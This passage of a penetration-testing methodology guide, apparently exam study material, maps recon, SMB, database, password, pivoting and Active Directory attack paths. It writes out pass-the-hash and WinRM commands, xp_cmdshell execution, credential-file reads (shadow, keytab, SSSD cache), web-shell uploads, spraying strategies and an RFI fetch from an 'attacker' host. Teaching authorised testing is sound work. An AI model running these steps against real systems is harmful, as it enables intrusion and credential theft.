| Responder hash | Crack with hashcat | — | — | Cleartext password | — | Lateral movement | Domain spray |

---

## 3. Missing Decision Trees

### 3.1 Decision Tree Specification: Recon & OSINT Tree

**File:** `decision-trees/recon-osint-flow.md`
**Priority:** CRITICAL

**Entry conditions:**
- In-scope domains or IPs provided
- No active scanning yet (pre-nmap phase)

**Branching logic:**
```
Scope domains provided?
├── Yes → Certificate Transparency (crt.sh)
│   ├── Subdomains found?
│   │   ├── Yes → Resolve to IPs
│   │   │   ├── In-scope IPs → Add to target list
│   │   │   └── Third-party (CDN) → Note out-of-scope
│   │   └── No → DNS brute force (dnsrecon)
│   │
│   ├── DNS records:
│   │   ├── A/AAAA → Map to IPs
│   │   ├── MX → Mail server targets
│   │   ├── NS → Name server targets (zone transfer?)
│   │   ├── TXT → SPF/DKIM info, potential misconfigs
│   │   └── CNAME → Third-party service mapping
│   │
│   └── SSL certificate analysis
│       └── SAN entries → More subdomains
│
├── IPs only → Shodan / WHOIS
│   ├── Organization → Verify scope
│   ├── Open ports → Prioritize scan targets
│   └── ASN → Additional netblocks?
│
└── Wayback Machine / Google dorking
    └── Historical endpoints → Hidden content
```

**Success paths:**
- Target list of IPs + domains for active scanning
- Subdomain list for web application testing
- Third-party infrastructure identified

**Failure paths:**
- Nothing found → Move to active scanning (Module 02) with broader scope
- Domain doesn't resolve → Check typos, alternate TLDs

**Cross-module references:**
- Target IPs → [Module 02: Enumeration](../modules/02-enumeration.md)
- Subdomains discovered → [Module 04: Web Application](../modules/04-web-application.md)
- Mail servers → [Module 07: Common Services](../modules/07-common-services.md)

### 3.2 Decision Tree Specification: SMB Attack Tree

**File:** `decision-trees/smb-attack-flow.md`
**Priority:** CRITICAL

**Entry conditions:**
- Port 139 or 445 identified as open
- SMB service running

**Branching logic:**
```
Port 445 open?
├── Null session / anonymous auth?
│   ├── Yes → enum4linux, smbclient -L
│   │   ├── Users enumerated?
│   │   │   ├── Yes → User list → Password spray (Module 06)
│   │   │   └── No → Move on
│   │   ├── Shares accessible?
│   │   │   ├── Readable share?
│   │   │   │   ├── Sensitive files? → Download
│   │   │   │   └── Nothing? → Move on
│   │   │   └── Writable share?
│   │   │       ├── Web-accessible path? → Upload webshell → RCE
│   │   │       └── Not web-accessible? → File upload for other attacks
│   │   └── Domain info? → AD module
│   │
│   └── No → Check SMB signing
│       ├── SMB signing disabled?
│       │   ├── Yes → NTLM relay possible
│       │   │   ├── Targets available? → ntlmrelayx
│       │   │   └── No targets? → Capture + crack
│       │   └── No → Move on
│       │
│       └── Check SMB version
│           ├── MS17-010 vulnerable?
│           │   └── Yes → EternalBlue exploit
│           └── Other known vulns? → searchsploit
│
├── Credentials available?
│   ├── Cleartext → netexec smb, smbmap
│   │   ├── Admin privs? → PSExec, SMBexec
│   │   └── User privs → Share access, file read
│   └── NT hash only → Pass-the-Hash
│       ├── Admin? → psexec.py -hashes
│       └── User? → Share access
│
└── No creds, no null → Move to other services
```

**Escalation paths:**
- Read share → Credentials → Password reuse → Other services
- Write share → Web shell → RCE → Full host
- SMB relay → Code execution on relay target
- Pass-the-Hash → Multiple host compromise
- MS17-010 → SYSTEM level access

### 3.3 Decision Tree Specification: Database Attack Tree

**File:** `decision-trees/database-attack-flow.md`
**Priority:** HIGH

**Entry conditions:**
- Port 1433 (MSSQL), 3306 (MySQL), 5432 (PostgreSQL), 1521 (Oracle), 6379 (Redis), 27017 (MongoDB) open

**Branching logic:**
```
Database port identified?
├── MSSQL (1433)
│   ├── Auth type: Windows or SQL?
│   │   ├── Windows auth → Need domain creds → Module 11
│   │   └── SQL auth → Default creds? (sa:sa, sa:empty)
│   │       ├── Success → xp_cmdshell enable → RCE
│   │       ├── xp_cmdshell disabled → Try alternative techniques
│   │       │   ├── xp_dirtree → Hash capture via SMB
│   │       │   ├── sp_OACreate → COM-based execution
│   │       │   ├── CLR assembly → .NET code execution
│   │       │   └── Agent job → Scheduled task RCE
│   │       └── Linked servers?
│   │           └── Enumerate linked servers → Lateral movement
│   └── Brute force → hydra
│
├── MySQL (3306)
│   ├── Default creds? (root:root, root:empty)
│   │   ├── FILE privilege?
│   │   │   ├── Yes → SELECT LOAD_FILE → Read files
│   │   │   │   └── /etc/passwd, config files, SSH keys
│   │   │   ├── SELECT INTO OUTFILE → Write web shell
│   │   │   └── Neither → Just dump databases
│   │   └── UDF exploit? → Plugin dir writable? → RCE
│   └── Brute force → hydra
│
├── PostgreSQL (5432)
│   ├── Default creds? (postgres:postgres)
│   ├── COPY FROM PROGRAM → RCE
│   ├── LOAD → C exploit (if available)
│   └── Brute force → hydra
│
├── Redis (6379)
│   ├── No auth?
│   │   ├── SSH key write to /root/.ssh → Root access
│   │   ├── Web shell write to /var/www/html
│   │   └── CONFIG GET → Information leak
│   └── Auth enabled? → Brute force?
│
├── MongoDB (27017)
│   └── No auth? → Dump all databases
│
└── Oracle (1521)
    ├── Default creds? (system:manager, scott:tiger)
    └── TNS poisoning → odat.py
```

### 3.4 Decision Tree Specification: Password Attack Tree

**File:** `decision-trees/password-attack-flow.md`
**Priority:** CRITICAL

**Entry conditions:**
- Hash or encrypted credential obtained
- OR username list available for online attack
- OR target service with authentication available

**Branching logic:**
```
Password attack needed?
├── OFFLINE (hash available)
│   ├── Identify hash type (hashid / hash-identifier)
│   ├── Quick wins first (in order):
│   │   1. rockyou.txt dictionary (fastest)
│   │   2. Dictionary + best64.rule (mutations)
│   │   3. d3ad0ne.rule (comprehensive)
│   │   4. OneRuleToRuleThemAll (exhaustive)
│   │   5. Mask attack (pattern-based)
│   │   6. Prince attack (probabilistic)
│   ├── Hash type specific:
│   │   ├── NTLM (-m 1000) → Very fast, try wordlist + rules
│   │   ├── NetNTLMv2 (-m 5600) → Fast, common in exam
│   │   ├── Kerberos TGS (-m 13100) → Medium speed
│   │   ├── Kerberos AS-REP (-m 18200) → Medium speed
│   │   ├── bcrypt (-m 3200) → Slow, use small targeted wordlist
│   │   └── SHA-512 (-m 1800) → Medium speed
│   └── Parallel sessions:
│       ├── Session 1: Dictionary attack (fast)
│       └── Session 2: Rule-based (slower, in background)
│
├── ONLINE (service accessible + username list)
│   ├── Determine password policy (if possible):
│   │   ├── Strict lockout (3-5 attempts) → Spray only
│   │   │   └── 1 password, ALL users, wait 30-60 min, repeat
│   │   ├── Lenient lockout (10+ attempts) → Small wordlist per user
│   │   ├── No lockout → Full brute force (hydra)
│   │   └── Unknown → Start conservatively, monitor for lockout
│   │
│   ├── Which service?
│   │   ├── SMB (445) → netexec smb
│   │   ├── WinRM (5985) → netexec winrm
│   │   ├── SSH (22) → hydra
│   │   ├── RDP (3389) → hydra, crowbar
│   │   ├── FTP (21) → hydra
│   │   ├── MSSQL (1433) → hydra, netexec mssql
│   │   ├── MySQL (3306) → hydra
│   │   ├── Web form → hydra, wpscan (if WordPress)
│   │   ├── LDAP (389) → netexec ldap
│   │   └── VNC (5900) → hydra
│   │
│   └── Spraying strategy (priority order):
│       1. Empty passwords (rare but exists)
│       2. Default passwords (admin:admin, etc.)
│       3. Company name + year (Contoso2024!)
│       4. Season + year (Spring2024!)
│       5. Common weak passwords (Password1, Welcome1)
│       6. Service name (SMB: smb123, FTP: ftp123)
│
├── CREDENTIAL STUFFING (creds from breach)
│   └── Use known passwords against target usernames
│
└── CRACKED PASSWORD → REUSE TESTING
    ├── Test against ALL services on originating host
    ├── Test against ALL hosts in subnet
    ├── Test against domain (if AD present)
    ├── Test different username/password combinations
    └── Check for elevated privileges with credential
```

### 3.5 Decision Tree Specification: Lateral Movement & Pivoting Tree

**File:** `decision-trees/lateral-pivot-flow.md`
**Priority:** CRITICAL

**Entry conditions:**
- Credentials obtained for another host
- OR shell access on multi-homed host
- OR new subnet discovered from routing table

**Branching logic:**
```
Movement opportunity?
├── HAVE CREDENTIALS for other host
│   ├── Check target host open ports
│   │   ├── Port 445 (SMB) → PSExec, SMBexec, WMIexec
│   │   │   ├── Cleartext → psexec.py domain/user:pass@target
│   │   │   ├── NT hash → psexec.py -hashes :hash domain/user@target
│   │   │   ├── Failed? → Try different protocol
│   │   │   └── SMB disabled? → Move on
│   │   ├── Port 5985/5986 (WinRM) → evil-winrm
│   │   │   ├── Cleartext → evil-winrm -i target -u user -p pass
│   │   │   └── NT hash → evil-winrm -i target -u user -H hash
│   │   ├── Port 3389 (RDP) → xfreerdp
│   │   │   ├── Cleartext → xfreerdp /v:target /u:user /p:pass
│   │   │   └── NT hash → xfreerdp /v:target /u:user /pth:hash
│   │   ├── Port 22 (SSH) → ssh
│   │   │   └── Cleartext only → ssh user@target
│   │   └── Port 135 (WMI) → wmiexec.py
│   │       ├── Cleartext → wmiexec.py user:pass@target
│   │       └── NT hash → wmiexec.py -hashes :hash user@target
│   │
│   └── Protocol priority order:
│       1. SMB (most reliable, PSExec gives SYSTEM)
│       2. WinRM (interactive shell if available)
│       3. WMI (reliable but slower)
│       4. RDP (GUI access, may trigger alert)
│       5. SSH (Linux/Windows 2019+, cleartext only)
│
├── ON NEW HOST → Post-exploitation loop
│   ├── Enumerate immediately:
│   │   ├── Current user privileges
│   │   ├── Network config (ipconfig/ifconfig, route, arp)
│   │   ├── Credential harvesting
│   │   └── Domain join status
│   └── Restart methodology from Module 13 on this host
│
├── PIVOT TO NEW SUBNET
│   ├── Which tool?
│   │   ├── Ligolo-ng (full VPN tunnel) → Best for thorough scans
│   │   │   ├── Root on pivot? → ligolo agent
│   │   │   └── No root? → Use chisel instead
│   │   ├── Chisel (SOCKS via TCP) → Good for restricted envs
│   │   ├── SSHuttle (VPN via SSH) → Linux pivot only
│   │   └── SSH -D (SOCKS proxy) → Simple, single port
│   │
│   └── After pivot deployed:
│       ├── Restart from Module 02: Scan new subnet
│       │   └── Full TCP scan on new subnet hosts
│       ├── Spray known creds on new hosts
│       └── Check for AD domain in new subnet
│
└── EXISTING HOST EXHAUSTED
    └── No creds, no pivot → Return to credential harvesting
```

### 3.6 Decision Tree Specification: Post-Exploitation & Credential Flow Tree

**File:** `decision-trees/post-exploit-flow.md`
**Priority:** HIGH

**Entry conditions:**
- Shell access on any host (any privilege level)

### 3.7 Decision Tree Specification: Credential Reuse & Flow Tree

**File:** `decision-trees/credential-flow.md`
**Priority:** HIGH

**Entry conditions:**
- Any credential obtained (password, hash, ticket, key)

### 3.8 Decision Tree Specification: Shell Upgrade & Initial Access Tree

**File:** `decision-trees/initial-access-flow.md`
**Priority:** MEDIUM

**Entry conditions:**
- RCE vector identified but no interactive shell yet

### 3.9 Decision Tree Specification: Common Applications Tree

**File:** `decision-trees/app-attack-flow.md`
**Priority:** MEDIUM

**Entry conditions:**
- CMS or common application identified during web testing

---

## 4. Attack Chain Mapping

### 4.1 Finding: SMB Share (Readable)

**Finding:** Anonymous or authenticated read access to SMB share

→ **Immediate Actions:**
- List all files recursively: `smbclient //target/share -N -c 'recurse; ls'`
- Download all interesting files: `smbclient //target/share -N -c 'get file'`
- Check every file for credentials, configs, sensitive data

→ **Follow-on Enumeration:**
- Check for more shares (hidden shares = $ suffix)
- Check for write access to any share
- If domain joined: enumerate users via RPC
- Check SMB version for known vulnerabilities

→ **Exploitation Paths:**
- Credentials in config files → Service/domain auth
- SSH keys → Direct access to other hosts
- Database connection strings → DB access
- HR/payroll data → Password pattern analysis
- Writable share → Web shell upload → RCE

→ **Credential Opportunities:**
- `web.config`, `app.config`, `.env`, `wp-config.php`
- `Unattend.xml` (cpassword)
- `.bash_history`, `.ssh/id_rsa*`
- `passwords.txt`, `creds.txt`, `passwd.xlsx` (users put them there)
- Database dump files (.sql, .bak, .dump)

→ **Privilege Escalation Opportunities:**
- Local admin passwords stored in scripts
- Service account credentials (for local service accounts)
- Kerberos ticket files (.kirbi)

→ **Lateral Movement Opportunities:**
- SSH keys → SSH to other hosts
- Domain credentials → RDP/WinRM/SMB to domain hosts
- Database credentials → DB server access
- Application credentials → Web app admin access

→ **Domain Escalation Opportunities:**
- Domain user credentials → BloodHound → AD attack chain
- Service account with SPN → Kerberoastable
- Domain admin credentials (copy of passwords stored by IT)

### 4.2 Finding: SQL Injection

**Finding:** SQL injection confirmed in web application parameter

→ **Immediate Actions:**
- Identify DB type (MySQL, MSSQL, PostgreSQL, Oracle)
- Identify injection type (error, union, blind, time-based)
- Extract current DB user
- Check user privileges

→ **Follow-on Enumeration:**
- List databases
- List tables in each database
- Look for `users`, `admins`, `config`, `credentials` tables
- Check for stored procedures, linked servers
- For MSSQL: check xp_cmdshell status

→ **Exploitation Paths:**
- **MSSQL:**
  - xp_cmdshell enable → OS commands → reverse shell
  - Linked servers → `OPENQUERY` → lateral movement
  - xp_dirtree → SMB hash capture
  - Agent jobs → scheduled task RCE
- **MySQL:**
  - LOAD_FILE → Read configs, SSH keys, source code
  - INTO OUTFILE → Write web shell → RCE
  - UDF → Custom function → OS commands
- **PostgreSQL:**
  - COPY FROM PROGRAM → OS commands → RCE
  - LOAD → C extension exploit

→ **Credential Opportunities:**
- Direct from database: user passwords (may be plaintext)
- Config files via LOAD_FILE: DB creds, API keys
- Application admin accounts
- Service account passwords

→ **Privilege Escalation Opportunities:**
- DB admin → OS admin via xp_cmdshell/UDF
- Application admin → More app functionality, file upload, RCE
- Stored admin session tokens

→ **Lateral Movement Opportunities:**
- MSSQL linked servers → New hosts via DB queries
- Password reuse from DB creds
- SSH keys read via LOAD_FILE
- SPN service accounts from DB

→ **Domain Escalation Opportunities:**
- Domain account creds in database → AD enumeration
- Service account SPN abuse
- MSSQL running as domain user

### 4.3 Finding: LFI / Path Traversal

**Finding:** File inclusion vulnerability in web application

→ **Immediate Actions:**
- Confirm by reading `/etc/passwd` or `php://filter`
- Determine inclusion type (LFI vs RFI)
- Identify PHP wrappers available
- Check for null byte or encoding bypasses needed

→ **Follow-on Enumeration:**
- Read `/etc/passwd` → User enumeration
- Read application source code → Find hardcoded creds
- Read `/proc/self/environ` → Environment variables
- Read `/proc/self/cmdline` → Process info
- Read config files (config.php, db.php, .env)
- Check for access/error log paths

→ **Exploitation Paths:**
- **Log poisoning:**
  - Inject PHP code in User-Agent
  - Include access log → Code executes → RCE
- **PHP wrappers:**
  - `php://input` → POST body as PHP code
  - `data://text/plain;base64,...` → Direct code execution
  - `expect://command` → If expect module loaded
  - `phar://` → Deserialization
- **/proc/self/environ** → PHP code in User-Agent
- **/proc/self/fd/X** → Try different file descriptors
- **RFI** → `http://attacker/shell.txt` → Remote code execution

→ **Credential Opportunities:**
- Database creds in config files
- Application passwords
- SSH private keys (if readable)
- API tokens in environment variables

→ **Privilege Escalation Opportunities:**
- Service/application user context via RCE
- Read `/etc/shadow` if permissions allow
- Read `/root/.ssh/id_rsa` if permissions allow

→ **Lateral Movement Opportunities:**
- SSH keys discovered → SSH to other hosts
- Database credentials → DB server
- Application admin → Web admin → Further access

→ **Domain Escalation Opportunities:**
- Domain credentials in configs
- Service account credentials from config files

### 4.4 Finding: File Upload Vulnerability

**Finding:** Arbitrary file upload or upload filter bypass achieved

→ **Immediate Actions:**
- Upload PHP/ASP/JSP web shell
- Verify upload path and file accessible
- Execute commands to confirm RCE

→ **Follow-on Enumeration:**
- If web shell: browse file system
- Check upload constraints (size limits, path traversal)
- Upload second-stage payload (reverse shell)
- Check for phar:// deserialization vector

→ **Exploitation Paths:**
- Web shell → Command execution → Reverse shell
- Polyglot file (image + PHP) → Bypass content validation
- Phar deserialization → Trigger via phar:// wrapper
- .htaccess upload → Override config → All files as PHP
- .user.ini upload → Auto-prepend PHP to all requests

→ **Credential Opportunities:**
- Read config files via web shell
- Dump database from web shell
- Environment variable exposure

→ **Privilege Escalation Opportunities:**
- Web user → OS user via shell upgrade
- Check sudo/suid from shell

→ **Lateral Movement Opportunities:**
- SSH keys found via file system access
- Internal network scanning from compromised host

→ **Domain Escalation Opportunities:**
- Domain credentials in configs
- Host is domain-joined → AD attack chain

### 4.5 Finding: Password / Credential Found

**Finding:** Cleartext password or crackable hash obtained

→ **Immediate Actions:**
- Immediately note: username, password, source, host, service
- Test credential against CURRENT host (different services)
- Add to credential tracking list

→ **Follow-on Enumeration:**
- Spray against ALL hosts in subnet
- Test against ALL services (SSH, RDP, SMB, WinRM, FTP)
- If domain credential: start BloodHound enumeration
- If local admin: create persistence, dump more creds

→ **Exploitation Paths:**
- **Cleartext password:**
  - SSH → ssh user@host
  - RDP → xfreerdp /v:host /u:user /p:pass
  - SMB → netexec smb host -u user -p pass -x whoami
  - WinRM → evil-winrm -i host -u user -p pass
  - Web app → Admin panel access
- **NTLM hash (for Pass-the-Hash):**
  - SMB → psexec.py -hashes :hash
  - WinRM → evil-winrm -H hash
  - RDP → xfreerdp /pth:hash

→ **Privilege Escalation Opportunities:**
- Local admin credentials → Full host control
- Domain user credentials → AD enumeration
- Service account credentials → Privileged access

→ **Lateral Movement Opportunities:**
- SMB/WinRM/RDP/SSH to ANY host the cred works on
- Spray credential across entire subnet
- Different username, same password → Password reuse

→ **Domain Escalation Opportunities:**
- Domain user → BloodHound → Kerberoast/ACL abuse
- Service account → Kerberoast/cracked → Lateral
- Domain admin → Full domain compromise

### 4.6 Finding: Kerberoastable Account (SPN Found)

**Finding:** User account with Service Principal Name identified

→ **Immediate Actions:**
- Request TGS ticket: `impacket-GetUserSPNs -request`
- Save ticket with correct hash format for hashcat (-m 13100)
- Note service account name and target service

→ **Follow-on Enumeration:**
- Identify which servers host the SPN services
- Check if service account is local admin on target servers
- Enumerate service functionality (MSSQL, IIS, etc.)

→ **Exploitation Paths:**
- Crack TGS → Cleartext password for service account
- Silver Ticket → Forge TGS for service access
- If service account = MSSQL/NETWORK SERVICE → Code execution

→ **Credential Opportunities:**
- Service account password (if cracked)
- Service account is often a privileged domain account

→ **Privilege Escalation Opportunities:**
- Service account may be local admin on multiple servers
- Service account may have delegation rights
- Some service accounts are in Domain Admins (misconfig)

→ **Lateral Movement Opportunities:**
- Service account creds → Access to service-hosting servers
- MSSQL service account → SQL Server admin → RCE
- Silver Ticket → Persistent service access

→ **Domain Escalation Opportunities:**
- Service account cracked → BloodHound with new creds
- Service account might have DCSync rights (rare but exists)
- Service account delegation → Impersonate DA

### 4.7 Finding: Responder Captured NetNTLMv2 Hash

**Finding:** NetNTLMv2 hash captured via LLMNR/NBT-NS poisoning

→ **Immediate Actions:**
- Save hash to file in correct format for hashcat (-m 5600)
- Note source IP and hostname of captured hash
- Start cracking immediately (background process)

→ **Follow-on Enumeration:**
- Check if SMB signing is disabled on any host → Relay opportunity
- Run responder again with different interface/time
- Responder analysis: which hosts are making requests?

→ **Exploitation Paths:**
- Crack hash → Cleartext password → Full authentication
- If SMB signing disabled → NTLM relay → Code exec on target
- Relay to ADCS → Certificate enrollment → Domain auth

→ **Credential Opportunities:**
- Cleartext password if cracked
- SMB relay → Active session on target

→ **Privilege Escalation Opportunities:**
- Cracked user may have local admin on some hosts
- Domain user → AD enumeration path

→ **Lateral Movement Opportunities:**
- Cracked password → Test across all hosts
- SMB relay → Immediate code execution on relay target
- NTLM relay to DC → Domain admin if relayed to ADCS

→ **Domain Escalation Opportunities:**
- Any domain user → Begin BloodHound enumeration
- Password spray using cracked password → More accounts
- SMB relay to ADCS → Certificate → DA

### 4.8 Finding: BloodHound Administrative Path

**Finding:** BloodHound reveals exploitable path to Domain Admin

→ **Immediate Actions:**
- Document the BloodHound path nodes and edges
- Validate the path is not theoretical (check permissions)
- Execute the first actionable step

→ **Follow-on Enumeration:**
- Enumerate specific hosts along the path
- Check for additional attack paths (redundancy)
- Identify all high-value targets reachable from this path

→ **Exploitation Paths (by BloodHound edge type):**
- **HasSession** → DA logged into host → Token theft/LSASS dump
- **AdminTo** → User admin on server → Cred harvest/WMI exec
- **ForceChangePassword** → Change target password → Access as target
- **GenericAll** → Full control of object → Add to DA group
- **GenericWrite** → Write properties → Kerberoast target/DCSync
- **WriteOwner** → Take ownership → Modify ACL → DA
- **WriteDACL** → Modify permissions → Grant DCSync → DA
- **AllExtendedRights** → Full control → DCSync
- **AddMember** → Add user to DA group
- **AllowedToDelegate** → RBCD → Impersonate DA
- **GetChanges/GetChangesAll** → DCSync rights → All hashes
- **Contains** → Inside high-value group → Escalate
- **GpLink** → GPO applies → GPO abuse → Deploy malicious policy
- **TrustedBy** → Cross-forest trust → Leverage to other domain

→ **Credential Opportunities:**
- LSASS dump from host with DA session
- Service account TGS from BloodHound identified SPNs

→ **Privilege Escalation Opportunities:**
- Each step in BloodHound path is a privilege escalation
- User → Group → Admin → DA chain

→ **Lateral Movement Opportunities:**
- Each compromised host enables further lateral movement
- WinRM/SMB/RDP to each hop in the attack path

→ **Domain Escalation Opportunities:**
- Terminal node of BloodHound path is DA
- DCSync after DA → All domain hashes
- Golden Ticket → Persistent domain access
- Trust attacks → Parent domain if DA in child

### 4.9 Finding: Shell on Domain-Joined Linux Host

**Finding:** Root or user-level shell on a Linux host that is domain-joined

→ **Immediate Actions:**
- Check domain join status: `realm list`, `sssd -i`, `cat /etc/krb5.keytab`
- Check for cached Kerberos tickets: `klist`
- Read `/etc/krb5.keytab` if root → Extract domain machine account hash
- Enumerate AD via LDAP from this host

→ **Follow-on Enumeration:**
- `net ads info` → DC information
- `ldapsearch` → Domain user/group enumeration
- Check SSSD cache: `/var/lib/sss/db/` → Cached domain creds
- Check keytab entries → Extract service accounts

→ **Exploitation Paths:**
- Machine account hash → AD machine account authentication
- Kerberos tickets → Pass-the-ticket to Windows hosts
- SSSD cache → Domain credentials in cache files
- Keytab abuse → Impersonate any host/service in keytab

→ **Credential Opportunities:**
- `/etc/krb5.keytab` → Machine account hash
- SSSD cache → Cached domain user credentials
- Cached TGT → Reuse before expiry
- `/etc/sssd/sssd.conf` → AD join credentials

→ **Privilege Escalation Opportunities:**
- Machine account → Limited AD access
- Cached domain user → Domain user privileges
- Root access → Full host compromise → AD lateral movement

→ **Lateral Movement Opportunities:**
- Pass-the-ticket to Windows hosts
- Machine account auth to SMB/WinRM on Windows hosts
- SSH to other Linux hosts with domain creds

→ **Domain Escalation Opportunities:**
- Machine account enumeration of AD
- Kerberos attacks using machine account
- Linux host compromise as stepping stone to Windows AD

### 4.10 Finding: MSSQL xp_cmdshell Enabled

**Finding:** xp_cmdshell is enabled and you have MSSQL access

→ **Immediate Actions:**
- Execute: `EXEC xp_cmdshell 'whoami'` → Check execution context
- Execute: `EXEC xp_cmdshell 'ipconfig'` → Check network
- Determine SQL Server service account

→ **Follow-on Enumeration:**
- Execute commands to explore file system
- Check MSSQL configuration for linked servers
- Check for other databases with interesting data
- Enumerate SQL Server Agent jobs

→ **Exploitation Paths:**
- Reverse shell → Full interactive shell
- Credential harvesting via command execution
- PowerShell download cradle → Load tools in memory
- Add local admin user

→ **Credential Opportunities:**
- Run mimikatz/powershell for LSASS dump
- Read config files with sensitive data
- SAM/SYSTEM registry hive dump (if SYSTEM context)

→ **Privilege Escalation Opportunities:**
- Service account context → Check for local admin
- SQL Server sysadmin → Full DB control
- If running as SYSTEM → Already max privilege on host

→ **Lateral Movement Opportunities:**
- Linked servers → Execute commands on linked SQL servers
- Service account domain access → AD enumeration
- SMB/WinRM with service account credentials

→ **Domain Escalation Opportunities:**
- Service account could be domain user → BloodHound
- SQL Server linked to other SQL servers → Chain lateral movement
- Service account SPN → Kerberoast path

---

## 5. Stuck Matrix

### 5.1 Stuck: No Web Findings (Ports 80/443 open but nothing exploitable)

**Likely causes:**
- Default/IIS welcome page only (no functionality)
- Single-page application (SPA) with minimal endpoints
- Redirect loop to other host/port
- Static site with no dynamic content
- Site behind authentication with no obvious bypass
- WAF/IPS blocking malicious probes
- JavaScript-heavy site that requires browser rendering

**Alternate techniques:**
- View page source: comments, hidden fields, JS files
- Check `/robots.txt`, `/sitemap.xml`, `/crossdomain.xml`
- Ffuf with DISCOVERY wordlists (not common.txt — try bigger)
- Ffuf for hidden parameters (GET and POST)
- NSE scripts: `http-enum`, `http-webdav-scan`, `http-shellshock`
- Burp spider / crawl (JS-heavy sites need AJAX spider)
- Check for subdomains: `ffuf -H "Host: FUZZ.target.com"`
- Check for web services on non-standard ports (8080, 8000, 8888, 9000, 5000, 3000, 8443)
- View SSL certificate for SAN entries (more hostnames)
- Wayback Machine: historical versions may have had more content
- Google dorking: `site:target.com`

**Enumeration expansion strategies:**
- Change user-agent (mobile, different browser)
- Try different HTTP methods (POST, PUT, DELETE, PATCH, OPTIONS)
- Check for API documentation: `/api`, `/swagger`, `/docs`, `/openapi.json`
- Check for GraphQL: `/graphql`, `/graphiql`
- WebSocket endpoint discovery
- Check for `.git`, `.svn`, `.DS_Store`, backup files
- Check for exposed environments: `/dev`, `/staging`, `/test`, `/uat`

**Validation steps:**
- Did you finger print the technology stack? (WhatWeb/Wappalyzer)
- Did you try content discovery with multiple wordlists?
- Did you check for VHosts?
- Did you scan ALL TCP ports for web servers?
- Did you check if the site is a known CMS?

### 5.2 Stuck: No Credentials

**Likely causes:**
- No credential harvesting performed yet
- No access to credential stores (no admin, no config files)
- Hashes captured but not cracked yet
- Only high-complexity passwords in use
- Wordlist too small or rules not applied
- Target uses MFA / smart cards

**Alternate techniques:**
- Run Responder for hash capture (internal network)
- AS-REP roasting (AD environment, no creds needed)
- LDAP anonymous bind → Full user dump → Spray
- SMB null session → User enumeration → Spray
- SMTP VRFY → User enumeration → Spray
- Kerbrute user enumeration → Spray
- Default credentials on ALL services
- SNMP community string (public) → Process/software enumeration
- Web scraping: company website, LinkedIn for username patterns

**Enumeration expansion strategies:**
- Check ALL default credentials across ALL services
- Expand wordlist: try SecLists/Passwords/Common-Credentials
- Try password mutations: company name + year, seasons, leetspeak
- Run hashcat in the background with multiple sessions
- Check for password reuse from any other context

**Validation steps:**
- Did you enumerate users from any source?
- Did you try default credentials on every service?
- Did you run Responder?
- Did you attempt to enumerate from SMB/DNS/LDAP/SMTP?

### 5.3 Stuck: No Initial Access (No RCE, No Shell)

**Likely causes:**
- All services fully patched
- No web application vulnerabilities found
- Strong authentication everywhere
- Firewalling prevents reverse shells (egress filtering)
- Payloads detected by AV/EDR
- Wrong payload type (staged vs stageless, reverse vs bind)
- Cannot transfer files to target

**Alternate techniques:**
- Try BIND shell instead of reverse (egress filtered)
- Change payload architecture: 32-bit vs 64-bit
- Try different ports for reverse shell (53, 80, 443, 8080)
- Use HTTP/S reverse shell (encapsulated in web traffic)
- Web shell instead of interactive (even partial command exec helps)
- SQLi → data extraction only → use creds elsewhere
- LFI → file read only → use info for other attacks
- File upload → use for phishing/social engineering
- Password spray → RDP/WinRM access (no exploit needed)
- SMB share → read files for intel → target other systems

**Enumeration expansion strategies:**
- Scan ALL 65535 TCP ports (you may have missed one)
- Scan top 100 UDP ports
- Check for internal hosts from compromised host
- Deploy pivot to reach otherwise inaccessible hosts
- Review scope: did you miss an attack surface?

**Validation steps:**
- Did you scan ALL TCP ports on ALL hosts?
- Did you try default credentials on every service?
- Did you check for SMB null sessions?
- Did you check for anonymous FTP?
- Did you run full web content discovery?
- Did you check for known CMS vulnerabilities?

### 5.4 Stuck: No Privilege Escalation

**Likely causes:**
- All common vectors checked and not exploitable
- Host fully patched
- No writable files/scripts
- Kernel exploit not available for this version
- Missing credentials for privileged user

**Alternate techniques:**
- **Linux:**
  - Run `pspy64` in background (you may miss transient cron jobs)
  - Check capabilities: `getcap -r / 2>/dev/null`
  - Check for sudo WITHOUT password: `sudo -l`
  - Check all users: `ls -la /home/*`, `cat /etc/passwd`
  - Check for SSH keys in other users' dirs
  - Check writable files in `/etc/`: `find /etc -writable -type f`
  - Check NFS mounts: `showmount -e localhost`
  - Check for tmux/screen sessions: `ls -la /tmp/`, `tmux ls`
  - Check for Docker group: `groups`, `docker ps`
  - Check for LXD group: `lxc list`
  - Check for writable `PATH` directory
  - Check for shared object hijack: `readelf -d <binary> | grep RUNPATH`
  - Logrotate exploit (versions 3.8.6-3.18.0)
  - Search for backup files with priv info
- **Windows:**
  - Run `winPEAS` if not done
  - Check AlwaysInstallElevated: registry check
  - Check for autoruns: `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - Check for mounted VHD/VHDX/VMDK files (contains alternate SAM)
  - Check for credential files: `*.vbs`, `*.ps1`, `*.bat` in Startup
  - Check registry for saved credentials: `cmdkey /list`
  - Check for GPP passwords: `groups.xml` in SYSVOL
  - Check for Web.config files (IIS servers)
  - Check for unattend.xml files
  - Check for McAfee/other security product credential files
  - Named pipe abuse
  - Check for DNS Admin group membership (if AD joined)

**Enumeration expansion strategies:**
- Transfer and run full automated enumeration tool (LinPEAS/winPEAS)
- Monitor the system for 5-10 minutes with pspy/ProcMon
- Check ALL scheduled tasks/cron jobs (not just obvious ones)
- Check for kernel exploits with appropriate suggesters (LES, Watson)
- Check if you missed a different user on the system

**Validation steps:**
- Did you run automated enumeration tools?
- Did you monitor for transient processes/scripts?
- Did you check for Docker/LXC/LXD?
- Did you check for NFS exports?
- Did you check all writable locations?
- Did you check for local credential stores?

### 5.5 Stuck: No AD Attack Path

**Likely causes:**
- No domain credentials
- No domain-joined hosts compromised
- Domain fully hardened (no known misconfigs)
- BloodHound path exists but not identified
- Missing a critical enumeration step

**Alternate techniques:**
- **Without credentials:**
  - Run Responder for longer period (24h+ background)
  - Check for SMB signing disabled → NTLM relay
  - Check for LDAP anonymous bind
  - Check for SMB null session
  - AS-REP roasting (no creds needed)
  - Kerbrute user enumeration → Spray common passwords
  - Check for MS17-010 (EternalBlue) on DCs
  - Check for web applications on DCs
  - Check for SNMP (public) on DCs for user enumeration
- **With credentials:**
  - Run BloodHound with all collection methods
  - Check Kerberoasting (all SPNs, not just users)
  - Check for delegations (unconstrained, constrained, RBCD)
  - Check ADCS (certipy find - all ESC scenarios)
  - Check ACLs carefully (ForceChangePassword, GenericAll, etc.)
  - Check Group membership thoroughly (nested groups)
